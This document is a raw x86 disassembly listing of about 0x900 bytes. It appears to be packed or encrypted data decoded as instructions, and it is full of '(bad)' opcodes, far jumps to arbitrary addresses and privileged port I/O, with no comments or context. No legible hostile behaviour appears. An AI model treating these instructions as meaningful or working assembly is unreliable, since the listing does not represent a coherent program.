  41189d:	cmp    ecx,DWORD PTR [ecx-0x4457257c]
  4118a3:	inc    BYTE PTR [eax]
	...
  4118cd:	add    cl,al
  4118cf:	or     DWORD PTR [ebx-0x4437557c],0xaf06bffe
  4118d9:	imul   BYTE PTR [ecx+0x3e02aad0]
  4118df:	jb     0x411915
  4118e1:	or     al,BYTE PTR [ecx-0x6e09510a]
  4118e7:	call   0x727f1b96
  4118ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118ed:	sbb    DWORD PTR [ecx+0x70af745a],eax
  4118f3:	pop    edi
  4118f4:	pop    ebp
  4118f5:	mov    esp,0xbc5d6eaa
  4118fa:	push   0x68ab935f
  4118ff:	pop    edi
  411900:	inc    ebp
  411901:	mov    esp,0x3b5152d2
  411906:	push   edx
  411907:	pop    edi
  411908:	xor    eax,0x356e8a80
  41190d:	mov    esp,0xde9c5a40
  411912:	cmp    BYTE PTR [ecx+0x5f30b40c],ch
  411918:	add    BYTE PTR [eax-0x43f2a169],bl
  41191e:	jmp    0x5874:0x18bbfd6f
  411925:	sub    DWORD PTR [ecx],edx
  411927:	pop    edi
  411928:	cmc    
  411929:	jne    0x41194c
  41192b:	addr16 in eax,dx
  41192d:	mov    ebx,0xabf0e900
	...
  41195a:	add    BYTE PTR [eax],al
  41195c:	fstp   QWORD PTR [ebp-0x23]
  41195f:	mov    ebx,0xb3c0a8f0
  411964:	call   0x5474d9c7
  411969:	pop    esi
  41196a:	lds    edi,FWORD PTR [ebx-0x40309c7e]
  411970:	rcr    DWORD PTR [esi-0x4b],cl
  411973:	mov    ebx,0x97c05f52
  411978:	imul   ebx,DWORD PTR [ebx-0x17],0xffffffcc
  41197c:	jg     0x4119d1
  41197e:	jmp    0x69b0ded3
  411983:	shl    BYTE PTR [ebp+0x6e2de8f1],0x5e
  41198a:	sti    
  41198b:	or     esp,DWORD PTR [esi-0x6f44fa2c]
  411991:	aam    0xff
  411993:	sub    eax,esi
  411995:	div    ch
  411997:	or     bh,bl
  411999:	pop    edx
  41199a:	(bad)  
  41199b:	fadd   QWORD PTR [ebp+0x73]
  41199e:	mov    ds:0xfe5db55f,al
  4119a3:	fdiv   QWORD PTR [ecx-0x6a1e8ba3]
  4119a9:	stos   BYTE PTR es:[edi],al
  4119aa:	inc    si
  4119ac:	xchg   ebp,eax
  4119ad:	xchg   ebx,eax
  4119ae:	shl    ebp,0x3d
  4119b1:	or     BYTE PTR [ebx-0x4653ebb],cl
  4119b7:	xchg   edi,eax
  4119b8:	in     al,dx
  4119b9:	lock call DWORD PTR [edx-0xe8ba2ce]
	...
  4119e8:	add    BYTE PTR [eax],al
  4119ea:	in     eax,0x7
  4119ec:	addr16 push ss
  4119ee:	in     eax,0xd2
  4119f0:	inc    esp
  4119f1:	or     eax,0xb14726b1
  4119f6:	sbb    BYTE PTR [ebx-0x75],0xbc
  4119fa:	adc    BYTE PTR [ebx],0x41
  4119fd:	jmp    0x754136bf
  411a02:	jle    0x4119f7
  411a04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a05:	dec    ebp
  411a06:	sbb    DWORD PTR [ebx+0x57],0xffffffd1
  411a0a:	sub    BYTE PTR ds:0x9b38e900,al
  411a10:	jae    0x411a00
  411a12:	(bad)  
  411a13:	jae    0x4119db
  411a15:	cmp    dl,BYTE PTR [ebp+0x3a514f5c]
  411a1b:	pop    ebx
  411a1c:	out    dx,eax
  411a1d:	ja     0x411a34
  411a1f:	lods   al,BYTE PTR ds:[esi]
  411a20:	arpl   WORD PTR [eax],bp
  411a22:	cmp    cl,BYTE PTR [ebx]
  411a24:	call   FWORD PTR [edx+ecx*2]
  411a27:	jae    0x4119fb
  411a29:	jnp    0x411a1f
  411a2b:	pop    esp
  411a2c:	out    0xb5,eax
  411a2e:	pop    edx
  411a2f:	pop    esi
  411a30:	inc    BYTE PTR [edx+0x80153a]
  411a36:	sbb    DWORD PTR [ecx+0x75],0x31a359fa
  411a3d:	ror    BYTE PTR [esi-0x5f],0xfd
  411a41:	call   DWORD PTR [eax]
  411a43:	test   al,0xac
  411a45:	cmp    BYTE PTR [eax+0x2a],ch
  411a48:	mov    ebx,0xfda58aff
  411a4d:	jne    0x411a4f
	...
  411a77:	add    BYTE PTR [edi-0x4f],bl
  411a7a:	addr16 lock mov al,ss:0x5e5d
  411a80:	push   cs
  411a81:	cwde   
  411a82:	add    al,BYTE PTR [eax]
  411a84:	stos   BYTE PTR es:[edi],al
  411a85:	int3   
  411a86:	jmp    0x9ac7:0x51a21b83
  411a8d:	mov    eax,ds:0x5927fffe
  411a92:	mov    DWORD PTR [ebp+0x53],0x17000058
  411a99:	into   
  411a9a:	inc    ebx
  411a9b:	or     al,0x94
  411a9d:	pusha  
  411a9e:	(bad)  
  411a9f:	je     0x411aaf
  411aa1:	outs   dx,BYTE PTR ds:[esi]
  411aa2:	mov    esi,0xc8fd352b
  411aa7:	ret    0x5923
  411aaa:	mov    ebx,0x591701
  411aaf:	jmp    0x411a37
  411ab1:	(bad)  
  411ab2:	jnp    0x411ac4
  411ab4:	out    0x2c,eax
  411ab6:	add    eax,0x89471a8b
  411abb:	sbb    al,dh
  411abd:	sub    al,0xc
  411abf:	call   FWORD PTR [edx]
  411ac1:	dec    edi
  411ac2:	call   0xfde3963d
  411ac7:	or     DWORD PTR [eax+edx*2+0x1dde0575],0xfffffff8
  411acf:	jmp    0x411b3a
  411ad1:	pop    es
  411ad2:	and    eax,0xfda2d07f
  411ad7:	or     DWORD PTR [esi],edi
  411ad9:	das    
  411ada:	mov    esp,0x57
	...
  411b03:	add    BYTE PTR [eax],al
  411b05:	add    bh,dl
  411b07:	repnz add eax,DWORD PTR [eax]
  411b0a:	ds pop edi
  411b0c:	add    al,0xeb
  411b0e:	dec    ebp
  411b0f:	icebp  
  411b10:	mov    esp,0x8b7f1307
  411b15:	inc    esp
  411b16:	xchg   cl,bh
  411b18:	dec    esi
  411b19:	cld    
  411b1a:	dec    ecx
  411b1b:	into   
  411b1c:	lds    eax,FWORD PTR [edi]
  411b1e:	jg     0x411b32
  411b20:	or     al,0x89
  411b22:	add    ecx,DWORD PTR [edx]
  411b24:	mov    edx,DWORD PTR [edx+eiz*2+0x19]
  411b28:	adc    eax,0x8d1a038b
  411b2d:	push   esp
  411b2e:	push   edx
  411b2f:	ins    DWORD PTR es:[edi],dx
  411b30:	pop    esi
  411b31:	rol    DWORD PTR [ecx+0x33],0xa4
  411b35:	push   es
  411b36:	mov    bh,0xb7
  411b38:	mov    edx,0x45369388
  411b3d:	xor    DWORD PTR ds:0xb59a306b,0xffffffae
  411b44:	push   es
  411b45:	and    DWORD PTR [esi+0x72],0x2d
  411b49:	push   es
  411b4a:	gs xor ch,ch
  411b4d:	shl    DWORD PTR ds:0x6448b74,1
  411b53:	stc    
  411b54:	dec    esi
  411b55:	cld    
  411b56:	gs cmp eax,esi
  411b59:	or     edi,DWORD PTR [esi]
  411b5b:	pop    ds
  411b5c:	(bad)  
  411b5d:	jmp    0x411b1c
  411b5f:	mov    ch,0xae
  411b61:	mov    al,ds:0x41f3c2
  411b66:	daa    
  411b67:	aaa    
  411b68:	or     BYTE PTR [esi+0x0],dh
	...
  411b93:	add    BYTE PTR [eax+0x49],al
  411b96:	(bad)  
  411b97:	enter  0x81fc,0x2
  411b9b:	call   DWORD PTR [ebx]
  411b9d:	out    dx,al
  411b9e:	mov    BYTE PTR [eax+0x3e],al
  411ba1:	call   0x8aa6:0x5ab967b8
  411ba8:	cli    
  411ba9:	bound  ebp,QWORD PTR [ebx+0x3e]
  411bac:	stos   BYTE PTR es:[edi],al
  411bad:	or     al,BYTE PTR [ecx-0x72a3fe04]
  411bb3:	mov    eax,0x2e864712
  411bb8:	inc    edx
  411bb9:	pop    esp
  411bba:	repz mov ebx,0xabe0e588
  411bc0:	icebp  
  411bc1:	imul   DWORD PTR [ebp-0x48]
  411bc4:	inc    esp
  411bc5:	fwait
  411bc6:	cmc    
  411bc7:	jg     0x411b64
  411bc9:	pop    edx
  411bca:	jmp    0xe52684d2
  411bcf:	mov    eax,0x2e4d62ea
  411bd4:	pop    edx
  411bd5:	jb     0x411c33
  411bd7:	and    dl,BYTE PTR [ecx+0x5b]
  411bda:	jno    0x411c1a
  411bdc:	cmp    ah,BYTE PTR [eax]
  411bde:	lods   al,BYTE PTR ds:[esi]
  411bdf:	adc    esi,DWORD PTR [ecx]
  411be1:	fadd   DWORD PTR [ebx+eax*1+0x2e265b3e]
  411be8:	dec    edx
  411be9:	pop    edx
  411bea:	xchg   ebp,eax
  411beb:	or     edx,DWORD PTR [esi]
  411bed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bee:	mov    bh,BYTE PTR [eax-0x505b1ae0]
  411bf4:	and    al,0xd0
  411bf6:	push   es
  411bf7:	inc    esi
	...
  411c20:	add    BYTE PTR [eax],al
  411c22:	or     al,BYTE PTR [edi+0x4f828c19]
  411c28:	(bad)  
  411c29:	fnstsw WORD PTR [ebp+0x4503a8e9]
  411c2f:	sub    eax,0xc3e5025c
  411c34:	push   ecx
  411c35:	add    al,0x8e
  411c37:	pop    edx
  411c38:	pop    ebp
  411c39:	or     al,0xd6
  411c3b:	ja     0x411c84
  411c3d:	mov    bh,0xd8
  411c3f:	pop    edx
  411c40:	cmp    eax,0xefd0d110
  411c45:	stos   DWORD PTR es:[edi],eax
  411c46:	daa    
  411c47:	mov    esi,0xe589b600
  411c4c:	push   ebx
  411c4d:	aad    0xbc
  411c4f:	xchg   esp,eax
  411c50:	add    BYTE PTR [esp+edi*1],bl
  411c53:	inc    esi
  411c54:	dec    ecx
  411c55:	jo     0x411c56
  411c57:	dec    esi
  411c58:	mov    ah,ah
  411c5a:	and    eax,ebp
  411c5c:	aas    
  411c5d:	jmp    0x1846601e
  411c62:	leave  
  411c63:	iret   
  411c64:	adc    al,0x18
  411c66:	ror    edi,1
  411c68:	clc    
  411c69:	jbe    0x411cba
  411c6b:	arpl   ax,bp
  411c6d:	lahf   
  411c6e:	sbb    al,0x5a
  411c70:	inc    al
  411c72:	inc    esp
  411c73:	sbb    esi,DWORD PTR [ebx+ebp*8-0x6c]
  411c77:	jg     0x411cc8
  411c79:	push   esi
  411c7a:	das    
  411c7b:	push   ebx
  411c7c:	(bad)  
  411c7d:	aam    0x91
  411c7f:	inc    edx
  411c80:	adc    al,0xc8
  411c82:	mov    BYTE PTR [ecx-0x2],bl
  411c85:	mov    ah,0x0
	...
  411caf:	add    BYTE PTR [ecx-0x7736f7be],dl
  411cb5:	pop    ecx
  411cb6:	cmp    al,0xe9
  411cb8:	cmp    eax,0x3f9f069b
  411cbd:	inc    esi
  411cbe:	or     DWORD PTR [edx+0x67],ebp
  411cc1:	dec    edi
  411cc2:	add    DWORD PTR [ebx+eiz*4+0x4f0e1945],ebx
  411cc9:	push   edi
  411cca:	jmp    0xfe9b8629
  411ccf:	es jg  0x411d29
  411cd2:	add    ecx,ebp
  411cd4:	cmp    eax,0x49a4895b
  411cd9:	and    al,BYTE PTR [ecx]
  411cdb:	jmp    0xde41781d
  411ce0:	cs push ebx
  411ce2:	jmp    0xfe9b5dbc
  411ce7:	bound  edi,QWORD PTR [esi+0x57]
  411cea:	enter  0xa500,0x6d
  411cee:	add    BYTE PTR [ebp+0x4c],dl
  411cf1:	add    dl,BYTE PTR [edi-0x75]
  411cf4:	adc    ah,BYTE PTR [ebx-0x7f]
  411cf7:	rcr    BYTE PTR [edi+0x40fce8ad],0x12
  411cfe:	dec    DWORD PTR [ebx+0xc7510df]
  411d04:	sbb    BYTE PTR [ecx-0x1],bl
  411d07:	jne    0x411ca0
  411d09:	loopne 0x411d51
  411d0b:	add    al,0x24
  411d0d:	xchg   ebx,eax
  411d0e:	or     al,0x0
  411d10:	xchg   ebx,eax
  411d11:	pusha  
  411d12:	std    
  411d13:	jne    0x411d15
	...
  411d3d:	add    BYTE PTR [ebx+0x570846e2],bl
  411d43:	adc    dh,BYTE PTR [ebp+0x8]
  411d46:	movq   mm5,QWORD PTR [eax-0x1]
  411d4a:	or     ch,ah
  411d4c:	inc    esp
  411d4d:	adc    al,0xde
  411d4f:	push   ebp
  411d50:	mov    dh,0x1
  411d52:	addr16 pop ebp
  411d54:	add    BYTE PTR [edi+0xe],bl
  411d57:	sbb    al,0xe
  411d59:	add    BYTE PTR [edx+0x1383e9e4],dh
  411d5f:	or     cl,BYTE PTR [ebx+0x1a1355]
  411d65:	add    BYTE PTR [edi],ah
  411d67:	pop    ebp
  411d68:	add    BYTE PTR [ebx],ch
  411d6a:	or     DWORD PTR gs:[ebp+0xc],eax
  411d6e:	push   ss
  411d6f:	pop    ebp
  411d70:	add    BYTE PTR [eax],al
  411d72:	clc    
  411d73:	call   0x60fba137
  411d78:	add    BYTE PTR [ebp-0x1c],dh
  411d7b:	adc    DWORD PTR [ebp+0x14],esi
  411d7e:	mov    ebp,0xbd006a5d
  411d83:	pop    esp
  411d84:	call   0xff4ff619
  411d89:	jmp    0x417adc
  411d8e:	lds    esi,FWORD PTR ds:0xdfaf3f0c
  411d95:	dec    BYTE PTR [ebx+0x32]
  411d98:	mov    ch,0x74
  411d9a:	sub    dh,BYTE PTR ss:[ecx]
  411d9d:	(bad)  
  411d9f:	adc    DWORD PTR [edx+0x44],ecx
	...
  411dc9:	add    BYTE PTR [eax],al
  411dcb:	add    BYTE PTR [edx+0x24142e09],bh
  411dd1:	inc    edx
  411dd2:	sub    BYTE PTR [ebx+edi*4],al
  411dd5:	jg     0x411d8f
  411dd7:	dec    edi
  411dd8:	xchg   esi,eax
  411dd9:	imul   esi,DWORD PTR [ebx+0x4db99fe],0x81423e02
  411de3:	jl     0x411e1f
  411de5:	inc    esp
  411de6:	das    
  411de7:	and    eax,DWORD PTR [ecx-0xc00eda9]
  411ded:	cmp    DWORD PTR [edx-0x4c3f23e3],ebp
  411df3:	mov    BYTE PTR [ebx],al
  411df5:	mov    dh,0xb3
  411df7:	je     0x411e43
  411df9:	sbb    al,0x2
  411dfb:	push   0x42
  411dfd:	mov    bh,0x3d
  411dff:	cld    
  411e00:	out    dx,al
  411e01:	test   eax,0x9949fef6
  411e06:	test   eax,0x2423fd6
  411e0b:	cmp    DWORD PTR [ebx+0x5e750136],0xffffff81
  411e12:	sub    eax,0xb5459410
  411e17:	je     0x411e4f
  411e19:	pop    edx
  411e1a:	inc    edi
  411e1b:	bound  ebx,QWORD PTR [ecx]
  411e1d:	imul   esi,DWORD PTR [ebx+0xec2a74],0x1ec3e6a
  411e27:	call   0xfef66f52
  411e2c:	out    0x92,eax
  411e2e:	add    DWORD PTR [eax],eax
	...
  411e58:	add    BYTE PTR [eax],al
  411e5a:	ds pop ebx
  411e5c:	push   0x36
  411e5e:	cmp    bl,BYTE PTR [edi+0x54]
  411e61:	loope  0x411e43
  411e63:	int    0xf7
  411e65:	mov    ah,0x52
  411e67:	arpl   WORD PTR [edi-0x38a7a1a0],di
  411e6d:	mov    al,BYTE PTR [edx+0x2a2ebf57]
  411e73:	(bad)
  411e76:	inc    edx
  411e77:	out    0x24,al
  411e79:	mov    eax,0xb5974301
  411e7e:	test   al,0x57
  411e80:	xchg   ecx,eax
  411e81:	mov    edi,DWORD PTR [esi]
  411e83:	pop    ebx
  411e84:	out    0x80,eax
  411e86:	sbb    ah,BYTE PTR [edi-0x1c]
  411e89:	sub    DWORD PTR cs:[eax-0x3],ebx
  411e8d:	adc    edx,DWORD PTR [ecx+eiz*2]
  411e90:	jle    0x411ec0
  411e92:	ss inc ebx
  411e94:	je     0x411eb8
  411e96:	jns    0x411eef
  411e98:	xor    BYTE PTR [edx],al
  411e9a:	ds pop ebx
  411e9c:	out    0xaa,eax
  411e9e:	aam    0x59
  411ea0:	out    0x3,eax
  411ea2:	mov    ebp,0xd2fde3d5
  411ea7:	jp     0x411ef7
  411ea9:	(bad)
  411eae:	shl    BYTE PTR [edx+0x4f],cl
  411eb1:	aam    0xde
  411eb3:	push   edi
  411eb4:	aaa    
  411eb5:	mov    ah,0xb2
  411eb7:	outs   dx,DWORD PTR ds:[esi]
  411eb8:	rol    DWORD PTR [eax],0xa4
  411ebb:	pop    ebx
  411ebc:	xchg   ecx,eax
  411ebd:	add    eax,DWORD PTR [eax]
	...
  411ee7:	add    BYTE PTR [esi],dl
  411ee9:	or     BYTE PTR [esi],bl
  411eeb:	mov    ah,0x20
  411eed:	inc    ebp
  411eee:	lods   eax,DWORD PTR ds:[esi]
  411eef:	add    bh,BYTE PTR [esi]
  411ef1:	pop    ebx
  411ef2:	push   0x36
  411ef4:	inc    edx
  411ef5:	pop    esi
  411ef6:	jl     0x411edb
  411ef8:	or     cl,dl
  411efa:	xlat   BYTE PTR ds:[ebx]
  411efb:	sub    DWORD PTR [esi],esi
  411efd:	push   esi
  411efe:	add    DWORD PTR [ebp+eax*2+0x43],edi
  411f02:	mov    eax,0xfe55aa88
  411f07:	pop    esp
  411f08:	inc    esi
  411f09:	rol    DWORD PTR [ecx],0x53
  411f0c:	cmp    al,cl
  411f0e:	add    cl,al
  411f10:	les    ebx,FWORD PTR [eax-0x2]
  411f13:	into   
  411f14:	mov    bl,0x75
  411f16:	(bad)  
  411f17:	call   0xedbcf959
  411f1c:	(bad)
  411f1f:	scas   al,BYTE PTR es:[edi]
  411f20:	pop    es
  411f21:	push   edi
  411f22:	add    ecx,ebp
  411f24:	cmp    eax,0x461cfd5b
  411f29:	rol    DWORD PTR [eax],0x13
  411f2c:	ss call 0x4333b475
  411f32:	gs (bad) 
  411f34:	int    0x55
  411f36:	call   0x9c61bf
  411f3b:	push   0x4f
  411f3d:	addr16 pop es
  411f3f:	cld    
  411f40:	dec    ecx
  411f41:	push   ds
  411f42:	inc    esp
  411f43:	ins    DWORD PTR es:[edi],dx
  411f44:	cmp    ebx,DWORD PTR [ebx+0x0]
  411f47:	jmp    0xd355eef8
	...
  411f74:	add    BYTE PTR [eax],al
  411f76:	cmp    eax,0x76404c1
  411f7b:	push   edi
  411f7c:	push   ecx
  411f7d:	inc    ecx
  411f7e:	clc    
  411f7f:	push   esp
  411f80:	inc    BYTE PTR [esi-0x55]
  411f83:	xor    DWORD PTR [ecx],eax
  411f85:	jmp    0xe5bcf9c7
  411f8a:	cmp    ecx,edi
  411f8c:	or     dh,BYTE PTR [ecx+0x3a]
  411f8f:	pop    ebx
  411f90:	add    cl,ch
  411f92:	retf   0x120
  411f95:	jmp    0xe5bcf9d7
  411f9a:	sbb    bh,cl
  411f9c:	or     dl,BYTE PTR [ecx+0x3a]
  411f9f:	pop    ebx
  411fa0:	add    BYTE PTR [eax],al
  411fa2:	pop    ss
  411fa3:	idiv   DWORD PTR [edx-0x7ea5e900]
  411fa9:	jge    0x411f8e
  411fab:	push   ebp
  411fac:	jo     0x412003
  411fae:	fsubr  QWORD PTR [edi]
  411fb0:	jb     0x412003
  411fb2:	push   esi
  411fb3:	mov    ecx,DWORD PTR [eax+eax*1]
  411fb6:	xlat   BYTE PTR ds:[ebx]
  411fb7:	cdq    
  411fb8:	push   es
  411fb9:	jae    0x411fda
  411fbb:	or     dh,BYTE PTR [ebp+0xc]
  411fbe:	jo     0x411f63
  411fc0:	hlt    
  411fc1:	xor    DWORD PTR [edx+0x13],0xa
  411fc5:	shl    DWORD PTR [edx+0x13],1
  411fc8:	push   DWORD PTR [ebp-0x5]
  411fcb:	icebp  
  411fcc:	add    BYTE PTR [esi-0x20],ah
  411fcf:	or     BYTE PTR [ecx+0x7508df45],cl
  411fd5:	adc    al,al
  411fd7:	xchg   edx,eax
  411fd8:	hlt    
  411fd9:	inc    DWORD PTR [eax]
	...
  412003:	add    BYTE PTR [edx],bh
  412005:	pop    es
  412006:	push   DWORD PTR [ebp-0x61]
  412009:	icebp  
  41200a:	pop    ecx
  41200b:	pusha  
  41200c:	ror    BYTE PTR [eax],0xff
  41200f:	jne    0x41207c
  412011:	ja     0x412015
  412013:	(bad)  
  412014:	jp     0x412023
  412016:	push   DWORD PTR [ebp-0x11]
  412019:	icebp  
  41201a:	sar    ch,1
  41201c:	loopne 0x412026
  41201e:	push   DWORD PTR [ebp-0x21]
  412021:	icebp  
  412022:	mov    ebx,0xb608f065
  412027:	add    DWORD PTR [edi+0x59],esp
  41202a:	add    bl,ch
  41202c:	ja     0x41200a
  41202e:	jl     0x41203c
  412030:	push   edx
  412031:	(bad)  
  412032:	push   ebx
  412033:	or     edx,DWORD PTR [ebp-0x6d]
  412036:	dec    edi
  412037:	and    edx,0xd7fffe54
  41203d:	bound  esi,QWORD PTR [ecx+0x48]
  412040:	inc    eax
  412041:	xchg   ebx,eax
  412042:	or     al,0x8f
  412044:	ds pop es
  412046:	mov    dh,0x82
  412048:	mov    ds:0x9bd1006e,eax
  41204d:	push   esi
  41204e:	mov    al,0x74
  412050:	or     ch,BYTE PTR [ebx+0x67]
  412053:	fs stc 
  412055:	dec    ebp
  412056:	jp     0x41209c
  412058:	test   BYTE PTR [ebp+0x36],0x10
  41205c:	jmp    0x6c3fd918
  412061:	cmp    dh,BYTE PTR [eax+0x21a4674]
  412067:	pusha  
	...
  412090:	add    BYTE PTR [eax],al
  412092:	shl    DWORD PTR ds:0xa83274b0,1
  412098:	add    edi,edi
  41209a:	dec    ebx
  41209b:	push   cs
  41209c:	mov    al,0x74
  41209e:	mov    dh,0x1a
  4120a0:	cmp    edi,ebp
  4120a2:	mov    cl,0x5
  4120a4:	mov    al,0x74
  4120a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120a7:	jmp    0x6c:0xf5a16523
  4120ae:	ds inc edx
  4120b0:	add    ch,bl
  4120b2:	cmp    ebp,DWORD PTR [edx+0x423e0004]
  4120b8:	mov    ebx,0x57422ec1
  4120bd:	mov    ebp,DWORD PTR [edx+0x74]
  4120c0:	cmp    DWORD PTR [esi+eax*2+0x42],0x37
  4120c5:	add    eax,0x3c68b08
  4120ca:	ds leave 
  4120cc:	xor    eax,0xb1386508
  4120d1:	xor    eax,0xff256a66
  4120d6:	dec    ecx
  4120d7:	ror    edx,0x3
  4120da:	mov    ebp,0x2f750254
  4120df:	lea    esi,ds:0x255a2608
  4120e5:	jmp    FWORD PTR [ecx]
  4120e7:	pop    ebx
  4120e8:	lds    edi,FWORD PTR [edx+0x56e75eff]
  4120ee:	lds    eax,FWORD PTR [esi+0x63]
  4120f1:	inc    edi
  4120f2:	inc    esi
  4120f3:	loopne 0x4120a9
  4120f5:	inc    DWORD PTR [eax]
	...
  41211f:	add    BYTE PTR [esi+ebx*2+0x6b828557],dh
  412126:	out    0x37,eax
  412128:	inc    ecx
  412129:	loopne 0x4120c7
  41212b:	adc    esi,ecx
  41212d:	mov    bl,BYTE PTR [esi+0x6]
  412130:	mov    ebp,0x6a03fbd5
  412135:	arpl   WORD PTR [edx+0x56],si
  412138:	xor    dl,BYTE PTR [eax+ebx*2+0x8]
  41213c:	rcr    DWORD PTR [eax+0x6a],0x2e
  412140:	es pop ebx
  412142:	cmp    edi,ebx
  412144:	mov    ah,0xad
  412146:	fist   WORD PTR [ebx-0x37]
  412149:	pop    eax
  41214a:	push   0x5
  41214c:	inc    esi
  41214d:	and    ch,BYTE PTR [edx+0x72ae3e17]
  412153:	lahf   
  412154:	mov    esp,0xf058bc1e
  412159:	fild   QWORD PTR [esp+edx*1]
  41215c:	jns    0x4121b8
  41215e:	out    0x3,eax
  412160:	ds pop ebx
  412162:	jb     0x4121aa
  412164:	xor    bl,BYTE PTR [eax+ebp*8]
  412167:	add    edi,DWORD PTR [esi]
  412169:	pop    ebx
  41216a:	out    0x84,eax
  41216c:	repnz (bad) 
  41216e:	out    0x36,eax
  412170:	and    BYTE PTR ss:[edi],0x51
  412174:	add    DWORD PTR [edx],esp
  412176:	sub    bh,bh
  412178:	pop    ecx
  412179:	push   esp
  41217a:	(bad)  
  41217c:	pop    ecx
  41217d:	in     eax,dx
  41217e:	stos   DWORD PTR es:[edi],eax
  41217f:	mov    al,0x48
  412181:	pop    edi
  412182:	daa    
  412183:	add    BYTE PTR ss:[eax],al
	...
  4121ae:	and    BYTE PTR ss:[edi],0x51
  4121b2:	cdq    
  4121b3:	and    al,0x1
  4121b5:	sub    esi,DWORD PTR [ecx]
  4121b7:	push   ebx
  4121b8:	mov    DWORD PTR [ebp+edx*8-0x3a0e8baf],esp
  4121bf:	add    eax,0x19ce1e5f
  4121c4:	inc    esp
  4121c5:	sbb    eax,0xe9005b3c
  4121ca:	mov    BYTE PTR [edi-0x687f6614],dl
  4121d0:	hlt    
  4121d1:	cdq    
  4121d2:	scas   al,BYTE PTR es:[edi]
  4121d3:	(bad)  
  4121d4:	or     BYTE PTR [ecx],al
  4121d6:	push   ss
  4121d7:	push   ebp
  4121d8:	(bad)  
  4121d9:	out    dx,al
  4121da:	xlat   BYTE PTR ds:[ebx]
  4121db:	xchg   edi,eax
  4121dc:	in     al,dx
  4121dd:	pop    esi
  4121de:	in     al,0xdd
  4121e0:	jnp    0x4121b7
  4121e2:	inc    edx
  4121e3:	mov    DWORD PTR [edx+eiz*8],0x208ceef
  4121ea:	add    dh,BYTE PTR [ecx+0x66fcb05d]
  4121f0:	add    BYTE PTR [edx],dl
  4121f2:	pop    es
  4121f3:	aas    
  4121f4:	mov    BYTE PTR [edx+edx*8],ch
  4121f7:	fstp   TBYTE PTR [ebx-0x3f]
  4121fa:	inc    edx
  4121fb:	pop    ebx
  4121fc:	mov    al,ds:0x29636be9
  412201:	test   eax,0xabc7b208
  412206:	ds pop ebx
  412208:	mov    DWORD PTR [edx+ebp*4],esp
  41220b:	sbb    esp,ecx
  41220d:	jmp    0x4121fc
  41220f:	inc    edx
  412210:	imul   eax,DWORD PTR ds:0x0,0x0
	...
  41223a:	add    BYTE PTR [eax],al
  41223c:	test   eax,0xae2c8851
  412241:	in     eax,0xf8
  412243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412244:	div    DWORD PTR [esi]
  412246:	add    ecx,ebp
  412248:	cmp    eax,0xbf1ae95b
  41224d:	xchg   edi,eax
  41224e:	lock mov ecx,0xb9f497be
  412254:	cwde   
  412255:	(bad)  
  412256:	or     BYTE PTR [eax],al
  412258:	out    dx,eax
  412259:	cmp    edx,0x4cd678ff
  41225f:	lock sub al,0x9b
  412262:	call   0xd09645de
  412267:	je     0x412290
  412269:	add    DWORD PTR [ebp-0x4],esi
  41226c:	das    
  41226d:	bound  esp,QWORD PTR [edi+edi*8+0x28]
  412271:	ss mov esi,0xc00ed85e
  412277:	or     al,0x17
  412279:	das    
  41227a:	dec    ebp
  41227b:	call   0xac25c578
  412280:	fs mov eax,gs
  412283:	add    BYTE PTR [ecx+0x58],dh
  412286:	cmp    DWORD PTR [ebp+0x3],0x64c1735e
  41228d:	mov    ebp,eax
  41228f:	add    BYTE PTR [edx+0x59],dh
  412292:	cmp    DWORD PTR [ebp-0xd],0xf810735d
  412299:	xchg   edx,eax
  41229a:	cld    
  41229b:	call   0x3e9f97
	...
  4122c8:	add    BYTE PTR [eax],al
  4122ca:	cmp    al,0x17
  4122cc:	pop    esp
  4122cd:	pop    edi
  4122ce:	ficomp WORD PTR [ebx]
  4122d0:	or     al,BYTE PTR [eax]
  4122d2:	adc    al,0x8b
  4122d4:	in     al,0x0
  4122d6:	xor    ah,BYTE PTR [edi+eiz*8-0x75]
  4122da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122db:	pop    ebp
  4122dc:	add    BYTE PTR [ebx+0x75fd6762],cl
  4122e2:	mov    bl,0xd0
  4122e4:	std    
  4122e5:	mov    ah,BYTE PTR [edx]
  4122e7:	add    eax,ecx
  4122e9:	loopne 0x412350
  4122eb:	lods   eax,DWORD PTR ds:[esi]
  4122ec:	call   0xff4357d1
  4122f1:	mov    DWORD PTR [edx+0x1b7d8b21],edx
  4122f7:	aad    0x74
  4122f9:	cld    
  4122fa:	ds popf 
  4122fc:	dec    ecx
  4122fd:	lods   eax,DWORD PTR ds:[esi]
  4122fe:	mov    ch,0x93
  412300:	mov    BYTE PTR [esi+ebx*2+0x43],0x2
  412305:	add    BYTE PTR [esi],bh
  412307:	mov    edi,0xb78ee048
  41230c:	dec    eax
  41230d:	hlt    
  41230e:	mov    ?,esp
  412310:	scas   al,BYTE PTR es:[edi]
  412311:	je     0x412349
  412313:	push   0xffffff9e
  412315:	cli    
  412316:	sbb    DWORD PTR [edx-0x6],esi
  412319:	mov    edi,0x7c83368a
  41231e:	adc    al,BYTE PTR [ebx+0x36]
  412321:	push   es
  412322:	mov    ebp,0x72ffa1d7
  412327:	sbb    BYTE PTR [ebx+0x3642de7c],al
  41232d:	or     BYTE PTR [eax],al
	...
  412357:	add    cl,ch
  412359:	(bad)  
  41235a:	mov    eax,ds:0xaba5bbe7
  41235f:	(bad)  
  412360:	fldenv [edi+0x2824e7d0]
  412366:	lods   al,BYTE PTR ds:[esi]
  412367:	dec    cl
  412369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41236a:	mov    al,0xe7
  41236c:	dec    ebx
  41236d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41236e:	stos   DWORD PTR es:[edi],eax
  41236f:	(bad)  
  412370:	add    cl,BYTE PTR gs:[edi+0x5f]
  412374:	xchg   DWORD PTR [ecx+eax*1],eax
  412377:	add    BYTE PTR [ebp-0x5e555b89],dh
  41237d:	xchg   DWORD PTR [eax+0x4d61b82],ebp
  412383:	je     0x4123bd
  412385:	lds    ebp,FWORD PTR ds:0x90673ef4
  41238b:	mov    bh,bl
  41238d:	inc    ebp
  41238e:	lods   eax,DWORD PTR ds:[esi]
  41238f:	je     0x41232b
  412391:	rol    DWORD PTR [edi+edi*8],0xeb
